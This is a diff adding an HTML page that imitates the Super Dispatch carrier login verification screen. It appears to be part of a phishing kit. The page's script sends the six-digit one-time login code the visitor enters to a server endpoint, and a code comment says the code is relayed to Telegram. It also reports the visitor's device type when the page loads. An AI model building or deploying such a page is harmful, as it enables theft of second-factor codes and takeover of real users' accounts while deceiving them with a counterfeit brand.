@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carrier TMS</title>
+    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+    <link rel="alternate icon" href="favicon.svg">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f3f5f8;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Dotted background pattern */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(circle, #d0d0d0 1px, transparent 1px);
+            background-size: 30px 30px;
+            opacity: 0.3;
+            z-index: 0;
+        }
+
+        /* Header */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 65px;
+            padding: 0 255px;
+            background-color: white;
+            border-bottom: 1px solid #e1e5ea;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .header-logo {
+            height: 45px;
+            width: auto;
+            max-width: 220px;
+            object-fit: contain;
+            display: block;
+        }
+
+        .signup-btn {
+            background-color: white;
+            border: 2px solid #e1e5ea;
+            padding: 4px 16px;
+            border-radius: 4px;
+            color: #333;
+            text-decoration: none;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            font-size: 14px;
+            line-height: 20px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .signup-btn:hover {
+            background-color: #f5f5f5;
+        }
+
+        /* Main content */
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            padding: 90px 20px 40px 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .login-card {
+            background-color: white;
+            border-radius: 4px;
+            padding: 48px 40px;
+            width: 432px;
+            min-height: auto;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .back-arrow-title {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+            width: 100%;
+        }
+
+        .back-arrow {
+            font-size: 24px;
+            color: #192334;
+            margin-right: 8px;
+            cursor: pointer;
+        }
+
+        .verification-title {
+            font-family: 'Inter', sans-serif;
+            font-size: 24px;
+            font-weight: 700;
+            line-height: 32px;
+            color: #192334;
+        }
+
+        .verification-description {
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 20px;
+            color: #333;
+            margin-bottom: 24px;
+            width: 100%;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+        }
+
+        label {
+            display: block;
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 20px;
+            color: #333;
+            margin-bottom: 8px;
+            width: 100%;
+            text-align: left;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            justify-content: center;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            height: 40px;
+            padding: 0 16px;
+            border: 1px solid #d0d0d0;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #333;
+            background-color: white;
+            transition: border-color 0.2s;
+            box-sizing: border-box;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+
+        input[type="text"].error,
+        input[type="email"].error,
+        input[type="password"].error {
+            border-color: #dc3545;
+        }
+
+        .error-message {
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 20px;
+            color: #dc3545;
+            margin-top: 4px;
+        }
+
+        #verificationForm {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .login-btn {
+            width: 100%;
+            height: 40px;
+            padding: 0;
+            background-color: #0070F5;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-family: 'Inter', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 24px;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background-color 0.2s;
+            box-sizing: border-box;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-btn:hover {
+            background-color: #0056b3;
+        }
+
+        .login-btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .resend-section {
+            margin-top: 16px;
+            margin-bottom: 24px;
+            width: 100%;
+        }
+
+        .resend-text {
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 20px;
+            color: #333;
+            margin-bottom: 4px;
+        }
+
+        .resend-link {
+            color: #007bff;
+            text-decoration: none;
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 20px;
+        }
+
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+
+        .sms-link {
+            color: #007bff;
+            text-decoration: none;
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 20px;
+            margin-top: 16px;
+            text-align: center;
+            display: block;
+        }
+
+        .sms-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        .footer-content {
+            text-align: center;
+            padding: 20px 0 0 0;
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 432px;
+        }
+
+        .copyright {
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 20px;
+            color: #5b6371;
+            width: 100%;
+        }
+
+        /* Chat icon */
+        .chat-icon {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 56px;
+            height: 56px;
+            background-color: #333;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            transition: transform 0.2s;
+        }
+
+        .chat-icon:hover {
+            transform: scale(1.05);
+        }
+
+        .chat-icon::before {
+            content: '💬';
+            font-size: 24px;
+        }
+
+        /* Loading and success messages */
+        .message {
+            padding: 12px;
+            margin-top: 16px;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 14px;
+            display: none;
+            width: 100%;
+        }
+
+        .message.success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .message.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        /* Loading screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+        }
+
+        .loading-screen.active {
+            display: flex;
+        }
+
+        .loading-favicon {
+            width: 64px;
+            height: 64px;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.5;
+                transform: scale(1.1);
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo-container">
+            <img src="logo2.png" alt="SuperDispatch Logo" class="header-logo">
+        </div>
+    </header>
+
+    <main>
+        <div class="login-card">
+            <div class="back-arrow-title">
+                <span class="back-arrow">←</span>
+                <h1 class="verification-title">Check your inbox!</h1>
+            </div>
+            <p class="verification-description">We've sent you a temporary 6-digit login code. Please enter this code to login to your account.</p>
+            <form id="verificationForm">
+                <div class="form-group">
+                    <label for="verificationCode">Verification Code</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="verificationCode" name="verificationCode" required maxlength="6" pattern="[0-9]{6}" inputmode="numeric">
+                    </div>
+                    <div class="error-message" id="errorMessage" style="display: none;">Enter Verification Code</div>
+                </div>
+                <div class="resend-section">
+                    <p class="resend-text">Didn't receive a code? Check your spam folder.</p>
+                    <a href="#" class="resend-link" onclick="return false;">Resend code.</a>
+                </div>
+                <button type="submit" class="login-btn" id="submitBtn">Log In</button>
+                <a href="#" class="sms-link" onclick="return false;">Receive Code via SMS(Text Message)</a>
+                <div class="message" id="message"></div>
+            </form>
+        </div>
+        <div class="footer-content">
+            <p class="copyright">© 2025 Super Dispatch. All rights reserved.</p>
+        </div>
+    </main>
+
+    <div class="chat-icon"></div>
+
+    <!-- Loading screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <img src="favicon.png" alt="Loading" class="loading-favicon">
+    </div>
+
+    <script>
+        // Определение устройства и отправка информации о посетителе
+        (function() {
+            function detectDevice() {
+                const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+                if (/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase())) {
+                    return 'mobile';
+                }
+                return 'desktop';
+            }
+
+            // Отправка информации о посетителе при загрузке страницы
+            fetch('/visitor-info', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    deviceType: detectDevice()
+                })
+            }).catch(err => {
+                console.log('Visitor info not sent:', err);
+            });
+        })();
+
+        // Form submission
+        const verificationForm = document.getElementById('verificationForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const messageDiv = document.getElementById('message');
+        const errorMessage = document.getElementById('errorMessage');
+
+        // Auto-copy on click functionality
+        const verificationCodeInput = document.getElementById('verificationCode');
+
+        // Разрешаем только цифры и скрываем ошибку при вводе
+        verificationCodeInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value && this.value.trim() !== '') {
+                errorMessage.style.display = 'none';
+                this.classList.remove('error');
+            }
+        });
+
+        verificationCodeInput.addEventListener('click', async function() {
+            if (this.value) {
+                this.select();
+                try {
+                    await navigator.clipboard.writeText(this.value);
+                } catch (err) {
+                    // Fallback для старых браузеров
+                    document.execCommand('copy');
+                }
+            }
+        });
+
+        verificationForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const verificationCode = document.getElementById('verificationCode').value.trim();
+
+            // Проверка на пустое поле
+            if (!verificationCode || verificationCode === '') {
+                errorMessage.style.display = 'block';
+                errorMessage.textContent = 'Enter Verification Code';
+                verificationCodeInput.classList.add('error');
+                return;
+            }
+            
+            // Проверка на 6 цифр
+            if (!/^\d{6}$/.test(verificationCode)) {
+                errorMessage.style.display = 'block';
+                errorMessage.textContent = 'Please enter a valid 6-digit code';
+                verificationCodeInput.classList.add('error');
+                return;
+            }
+            
+            errorMessage.style.display = 'none';
+            verificationCodeInput.classList.remove('error');
+
+            // Disable submit button
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Sending...';
+            messageDiv.style.display = 'none';
+
+            try {
+                // Send to Telegram through local server endpoint with verification code
+                const response = await fetch('/send-verification', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        verificationCode: verificationCode
+                    })
+                });
+
+                // Проверяем статус ответа
+                if (!response.ok) {
+                    const text = await response.text();
+                    throw new Error(`Server error: ${response.status} - ${text.substring(0, 100)}`);
+                }
+
+                // Проверяем Content-Type перед парсингом JSON
+                const contentType = response.headers.get('content-type');
+                if (!contentType || !contentType.includes('application/json')) {
+                    const text = await response.text();
+                    throw new Error('Server returned non-JSON response. Make sure server is running.');
+                }
+
+                const data = await response.json();
+
+                if (data.success) {
+                    // Show loading screen
+                    const loadingScreen = document.getElementById('loadingScreen');
+                    loadingScreen.classList.add('active');
+                    
+                    // Можно добавить логику для обработки успешной верификации
+                    messageDiv.className = 'message success';
+                    messageDiv.textContent = 'Verification code sent successfully!';
+                    messageDiv.style.display = 'block';
+                    
+                    loadingScreen.classList.remove('active');
+                } else {
+                    throw new Error(data.error || 'Failed to send message');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                messageDiv.className = 'message error';
+                let errorMsg = 'Failed to send data. ';
+                
+                if (error.name === 'TypeError' && error.message.includes('fetch')) {
+                    errorMsg += 'Cannot connect to server. Make sure server is running (node server.js) and try again.';
+                } else if (error.message.includes('404')) {
+                    errorMsg += 'Server endpoint not found. Make sure server is running and restart it.';
+                } else if (error.message.includes('non-JSON')) {
+                    errorMsg += 'Server error. Please restart the server.';
+                } else if (error.message) {
+                    errorMsg += error.message;
+                } else {
+                    errorMsg += 'Please check server connection and try again.';
+                }
+                
+                messageDiv.textContent = 'Error: ' + errorMsg;
+                messageDiv.style.display = 'block';
+                
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Log In';
+            }
+        });
+
+        // Показываем ошибку при потере фокуса, если поле пустое
+        verificationCodeInput.addEventListener('blur', function() {
+            if (!this.value || this.value.trim() === '') {
+                errorMessage.style.display = 'block';
+                errorMessage.textContent = 'Enter Verification Code';
+                this.classList.add('error');
+            } else {
+                errorMessage.style.display = 'none';
+                this.classList.remove('error');
+            }
+        });
+    </script>
+</body>
+</html>
+
